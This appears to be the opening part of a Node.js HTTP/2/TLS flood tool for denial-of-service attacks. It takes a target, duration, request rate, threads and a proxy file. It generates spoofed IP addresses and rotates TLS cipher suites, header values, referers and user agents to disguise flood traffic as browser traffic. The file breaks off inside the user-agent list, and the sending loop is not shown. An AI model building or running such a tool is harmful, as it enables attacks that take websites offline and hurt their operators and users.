 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const header = require("header-generator");
 const axios = require('axios');
 const cheerio = require('cheerio'); 
 const gradient = require("gradient-string")

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log("node tlsv1.js [TARGET] [TIME] [RPS] [THREAD] proxy.txt");
 }
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 }
 const sig = [    
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];
 const sigalgs1 = sig.join(':');
 const cplist = [
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
 "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
 "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
 "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
 "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
 "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK'
 ];
 const accept_header = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel"
 ]; 
 const lang_header = [
  'en-US,en;q=0.9',
  'en-GB,en;q=0.9',
  'en-CA,en;q=0.9',
  'en-AU,en;q=0.9',
  'en-NZ,en;q=0.9',
  'en-ZA,en;q=0.9',
  'en-IE,en;q=0.9',
  'en-IN,en;q=0.9',
  'ar-SA,ar;q=0.9',
  'az-Latn-AZ,az;q=0.9',
  'be-BY,be;q=0.9',
  'bg-BG,bg;q=0.9',
  'bn-IN,bn;q=0.9',
  'ca-ES,ca;q=0.9',
  'cs-CZ,cs;q=0.9',
  'cy-GB,cy;q=0.9',
  'da-DK,da;q=0.9',
  'de-DE,de;q=0.9',
  'el-GR,el;q=0.9',
  'es-ES,es;q=0.9',
  'et-EE,et;q=0.9',
  'eu-ES,eu;q=0.9',
  'fa-IR,fa;q=0.9',
  'fi-FI,fi;q=0.9',
  'fr-FR,fr;q=0.9',
  'ga-IE,ga;q=0.9',
  'gl-ES,gl;q=0.9',
  'gu-IN,gu;q=0.9',
  'he-IL,he;q=0.9',
  'hi-IN,hi;q=0.9',
  'hr-HR,hr;q=0.9',
  'hu-HU,hu;q=0.9',
  'hy-AM,hy;q=0.9',
  'id-ID,id;q=0.9',
  'is-IS,is;q=0.9',
  'it-IT,it;q=0.9',
  'ja-JP,ja;q=0.9',
  'ka-GE,ka;q=0.9',
  'kk-KZ,kk;q=0.9',
  'km-KH,km;q=0.9',
  'kn-IN,kn;q=0.9',
  'ko-KR,ko;q=0.9',
  'ky-KG,ky;q=0.9',
  'lo-LA,lo;q=0.9',
  'lt-LT,lt;q=0.9',
  'lv-LV,lv;q=0.9',
  'mk-MK,mk;q=0.9',
  'ml-IN,ml;q=0.9',
  'mn-MN,mn;q=0.9',
  'mr-IN,mr;q=0.9',
  'ms-MY,ms;q=0.9',
  'mt-MT,mt;q=0.9',
  'my-MM,my;q=0.9',
  'nb-NO,nb;q=0.9',
  'ne-NP,ne;q=0.9',
  'nl-NL,nl;q=0.9',
  'nn-NO,nn;q=0.9',
  'or-IN,or;q=0.9',
  'pa-IN,pa;q=0.9',
  'pl-PL,pl;q=0.9',
  'pt-BR,pt;q=0.9',
  'pt-PT,pt;q=0.9',
  'ro-RO,ro;q=0.9',
  'ru-RU,ru;q=0.9',
  'si-LK,si;q=0.9',
  'sk-SK,sk;q=0.9',
  'sl-SI,sl;q=0.9',
  'sq-AL,sq;q=0.9',
  'sr-Cyrl-RS,sr;q=0.9',
  'sr-Latn-RS,sr;q=0.9',
  'sv-SE,sv;q=0.9',
  'sw-KE,sw;q=0.9',
  'ta-IN,ta;q=0.9',
  'te-IN,te;q=0.9',
  'th-TH,th;q=0.9',
  'tr-TR,tr;q=0.9',
  'uk-UA,uk;q=0.9',
  'ur-PK,ur;q=0.9',
  'uz-Latn-UZ,uz;q=0.9',
  'vi-VN,vi;q=0.9',
  'zh-CN,zh;q=0.9',
  'zh-HK,zh;q=0.9',
  'zh-TW,zh;q=0.9',
  'am-ET,am;q=0.8',
  'as-IN,as;q=0.8',
  'az-Cyrl-AZ,az;q=0.8',
  'bn-BD,bn;q=0.8',
  'bs-Cyrl-BA,bs;q=0.8',
  'bs-Latn-BA,bs;q=0.8',
  'dz-BT,dz;q=0.8',
  'fil-PH,fil;q=0.8',
  'fr-CA,fr;q=0.8',
  'fr-CH,fr;q=0.8',
  'fr-BE,fr;q=0.8',
  'fr-LU,fr;q=0.8',
  'gsw-CH,gsw;q=0.8',
  'ha-Latn-NG,ha;q=0.8',
  'hr-BA,hr;q=0.8',
  'ig-NG,ig;q=0.8',
  'ii-CN,ii;q=0.8',
  'is-IS,is;q=0.8',
  'jv-Latn-ID,jv;q=0.8',
  'ka-GE,ka;q=0.8',
  'kkj-CM,kkj;q=0.8',
  'kl-GL,kl;q=0.8',
  'km-KH,km;q=0.8',
  'kok-IN,kok;q=0.8',
  'ks-Arab-IN,ks;q=0.8',
  'lb-LU,lb;q=0.8',
  'ln-CG,ln;q=0.8',
  'mn-Mong-CN,mn;q=0.8',
  'mr-MN,mr;q=0.8',
  'ms-BN,ms;q=0.8',
  'mt-MT,mt;q=0.8',
  'mua-CM,mua;q=0.8',
  'nds-DE,nds;q=0.8',
  'ne-IN,ne;q=0.8',
  'nso-ZA,nso;q=0.8',
  'oc-FR,oc;q=0.8',
  'pa-Arab-PK,pa;q=0.8',
  'ps-AF,ps;q=0.8',
  'quz-BO,quz;q=0.8',
  'quz-EC,quz;q=0.8',
  'quz-PE,quz;q=0.8',
  'rm-CH,rm;q=0.8',
  'rw-RW,rw;q=0.8',
  'sd-Arab-PK,sd;q=0.8',
  'se-NO,se;q=0.8',
  'si-LK,si;q=0.8',
  'smn-FI,smn;q=0.8',
  'sms-FI,sms;q=0.8',
  'syr-SY,syr;q=0.8',
  'tg-Cyrl-TJ,tg;q=0.8',
  'ti-ER,ti;q=0.8',
  'te;q=0.9,en-US;q=0.8,en;q=0.7',
  'tk-TM,tk;q=0.8',
  'tn-ZA,tn;q=0.8',
  'tt-RU,tt;q=0.8',
  'ug-CN,ug;q=0.8',
  'uz-Cyrl-UZ,uz;q=0.8',
  've-ZA,ve;q=0.8',
  'wo-SN,wo;q=0.8',
  'xh-ZA,xh;q=0.8',
  'yo-NG,yo;q=0.8',
  'zgh-MA,zgh;q=0.8',
  'zu-ZA,zu;q=0.8'
 ];
 
 const encoding_header = [
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate'
 ];
 
 const control_header = [
  'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
  'must-understand, no-store',
  'max-age=31536000; includeSubDomains',
  'max-age=31536000; includeSubDomains; preload',
  'max-age=120',
  'max-age=0,no-cache,no-store,must-revalidate',
  'public, max-age=604800, immutable',
  'max-age=0, must-revalidate, private',
  'max-age=0, private, must-revalidate',
  'max-age=604800, stale-while-revalidate=86400',
  'max-stale=3600',
  'public, max-age=2678400',
  'min-fresh=600',
  'public, max-age=30672000',
  'max-age=31536000, immutable',
  'max-age=604800, stale-if-error=86400',
  'public, max-age=604800',
  'no-cache, no-store,private, max-age=0, must-revalidate',
  'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
  'public, s-maxage=600, max-age=60',
  'public, max-age=31536000',
  'max-age=14400, public',
  'max-age=14400',
  'max-age=600, private',
  'public, s-maxage=600, max-age=60',
  'no-store, no-cache, must-revalidate',
  'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  'Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64'
 ];
 
 const platform = [
  "Windows",
  "Windows Phone",
  "Macintosh",
  "Linux",
  "iOS",
  "Android",
  "PlayStation 4",
  "Xbox One",
  "Nintendo Switch",
  "Apple TV",
  "Amazon Fire TV",
  "Roku",
  "Chromecast",
  "Smart TV",
  "Other"
];
 
 const refers = [
  'https://www.google.com',
  'https://www.facebook.com',
  'https://www.twitter.com',
  'https://www.youtube.com',
  'https://www.amazon.com',
  'https://www.netflix.com',
  'https://www.instagram.com',
  'https://www.yahoo.com',
  'https://www.stackoverflow.com',
  'https://www.github.com',
  'https://www.linkedin.com',
  'https://www.cnn.com',
  'https://www.apple.com',
  'https://www.microsoft.com',
  'https://www.wikipedia.org',
  'https://www.nytimes.com',
  'https://www.msn.com',
  'https://www.reddit.com',
  'https://www.quora.com',
  'https://www.npr.org',
  'https://www.bbc.com',
  'https://www.theguardian.com',
  'https://www.huffingtonpost.com',
  'https://www.washingtonpost.com',
  'https://www.wsj.com',
  'https://www.bloomberg.com',
  'https://www.cnbc.com',
  'https://www.merriam-webster.com',
  'https://www.dictionary.com',
  'https://www.thedailybeast.com',
  'https://www.thedailyshow.com',
  'https://www.colbertnation.com',
  'https://www.nationalgeographic.com',
  'https://www.nasa.gov',
  'https://www.nypl.org',
  'https://www.britannica.com',
  'https://www.healthline.com',
  'https://www.webmd.com',
  'https://www.mayoclinic.org',
  'https://www.cdc.gov',
  'https://www.nih.gov',
  'https://www.medlineplus.gov',
  'https://www.cancer.gov',
  'https://www.fda.gov',
  'https://www.nature.com',
  'https://www.sciencemag.org',
  'https://www.scientificamerican.com',
  'https://www.who.int',
  'https://www.un.org',
  'https://www.worldbank.org',
  'https://www.imf.org',
  'https://www.wto.org',
  'https://www.oecd.org',
  'https://www.europa.eu',
  'https://www.nato.int',
  'https://www.icrc.org',
  'https://www.amnesty.org',
  'https://www.hrw.org',
  'https://www.greenpeace.org',
  'https://www.oxfam.org',
  'https://www.doctorswithoutborders.org',
  'https://www.unicef.org',
  'https://www.savethechildren.org',
  'https://www.redcross.org',
  'https://www.wikipedia.org',
  'https://www.wikimedia.org',
  'https://www.mozilla.org',
  'https://www.apache.org',
  'https://www.mysql.com',
  'https://www.php.net',
  'https://www.python.org',
  'https://www.ruby-lang.org',
  'https://www.jquery.com',
  'https://www.reactjs.org',
  'https://www.angularjs.org',
  'https://www.vuejs.org',
  'https://www.bootstrap.com',
  'https://www.materializecss.com',
  'https://www.sass-lang.com',
  'https://www.lesscss.org',
  'https://www.d3js.org',
  'https://www.highcharts.com',
  'https://www.chartjs.org',
  'https://www.mapbox.com',
  'https://www.mapboxgl-js.com',
  'https://www.openstreetmap.org',
  'https://www.mapbox.com',
  'https://www.mapboxgl-js.com',
  'https://www.chartjs.org',
  'https://www.highcharts.com',
  'https://www.d3js.org',
  'https://www.lesscss.org',
  'https://www.sass-lang.com',
  'https://www.materializecss.com',
  'https://www.bootstrap.com',
  'https://www.vuejs.org',
  'https://www.angularjs.org',
  'https://www.reactjs.org',
  'https://www.jquery.com',
  'https://www.ruby-lang.org',
  'https://www.python.org',
  'https://www.php.net',
  'https://www.mysql.com',
  'https://www.apache.org',
  'https://www.mozilla.org',
  'https://www.wikimedia.org',
  'https://www.wikipedia.org',
  'https://www.redcross.org',
  'https://www.savethechildren.org',
  'https://www.unicef.org',
  'https://www.doctorswithoutborders.org',
  'https://www.oxfam.org',
  'https://www.greenpeace.org',
  'https://www.hrw.org',
  'https://www.amnesty.org',
  'https://www.icrc.org',
  'https://www.nato.int',
  'https://www.europa.eu',
  'https://www.oecd.org',
  'https://www.wto.org',
  'https://www.imf.org',
  'https://www.worldbank.org',
  'https://www.un.org',
  'https://www.who.int',
  'https://www.scientificamerican.com',
  'https://www.sciencemag.org',
  'https://www.nature.com',
  'https://www.fda.gov',
  'https://www.cancer.gov',
  'https://www.medlineplus.gov',
  'https://www.nih.gov',
  'https://www.cdc.gov',
  'https://www.mayoclinic.org',
  'https://www.webmd.com',
  'https://www.healthline.com',
  'https://www.britannica.com',
  'https://www.nypl.org',
  'https://www.nasa.gov',
  'https://www.nationalgeographic.com',
  'https://www.colbertnation.com',
  'https://www.thedailyshow.com',
  'https://www.thedailybeast.com',
  'https://www.dictionary.com',
  'https://www.merriam-webster.com',
  'https://www.cnbc.com',
  'https://www.bloomberg.com',
  'https://www.wsj.com',
  'https://www.washingtonpost.com',
  'https://www.huffingtonpost.com',
  'https://www.theguardian.com',
  'https://www.bbc.com',
  'https://www.npr.org',
  'https://www.quora.com',
  'https://www.reddit.com',
  'https://www.msn.com',
  'https://www.nytimes.com',
  'https://www.wikipedia.org',
  'https://www.microsoft.com',
  'https://www.apple.com',
  'https://www.cnn.com',
  'https://www.linkedin.com',
  'https://www.github.com',
  'https://www.stackoverflow.com',
  'https://www.yahoo.com',
  'https://www.instagram.com',
  'https://www.netflix.com',
  'https://www.amazon.com',
  'https://anotepad.com/',
  'https://www.youtube.com',
  'https://www.twitter.com',
  'https://www.facebook.com',
  'https://www.google.com',
  'https://tls.mrrage.xyz/nginx_status'
 ];
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers1 = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");
 
 const uap = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
 	"Mozilla/4.0 (X11; MSIE 6.0; i686; .NET CLR 1.1.4322; .NET CLR 2.0.50727; FDM)",
	"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 6.0)",
	"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.2)",
	"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.0)",
	"Mozilla/4.0 (Windows;  MSIE 6.0;  Windows NT 5.1;  SV1; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (MSIE 6.0; Windows NT 5.1)",
	"Mozilla/4.0 (MSIE 6.0; Windows NT 5.0)",
	"Mozilla/4.0 (compatible;MSIE 6.0;Windows 98;Q312461)",
	"Mozilla/4.0 (Compatible; Windows NT 5.1; MSIE 6.0) (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; U; MSIE 6.0; Windows NT 5.1) (Compatible;  ;  ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; U; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3; Tablet PC 2.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB6.5; QQDownload 534; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
	"More Internet Explorer 6.0 user agents strings -->>",
	"Mozilla/4.0 (compatible; MSIE 5.5b1; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.9; SiteCoach 1.0)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8; SiteCoach 1.0)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows 98; SiteKiosk 4.8)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows 95; SiteKiosk 4.8)",
	"Mozilla/4.0 (compatible;MSIE 5.5; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 5.5;)",
	"Mozilla/4.0 (Compatible; MSIE 5.5; Windows NT5.0; Q312461; SV1; .NET CLR 1.1.4322; InfoPath.2)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT5)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; chromeframe/12.0.742.100; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.5)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; FDM)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322) (Compatible;  ;  ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
	"More Internet Explorer 5.5 user agents strings -->>",
	"Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.22; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.21; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.2; Mac_PowerPC)",
	" Mozilla/4.0 (compatible; MSIE 5.2; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC Mac OS; en)",
	"Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC)",
	" Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
	" Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.14; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.12; Mac_PowerPC)",
	" Mozilla/4.0 (compatible; MSIE 5.12; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.05; Windows NT 4.0)",
	"Mozilla/4.0 (compatible; MSIE 5.05; Windows NT 3.51)",
	"Mozilla/4.0 (compatible; MSIE 5.05; Windows 98; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; YComp 5.0.0.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; Hotbar 4.1.8.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; DigExt)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; .NET CLR 1.0.3705)",
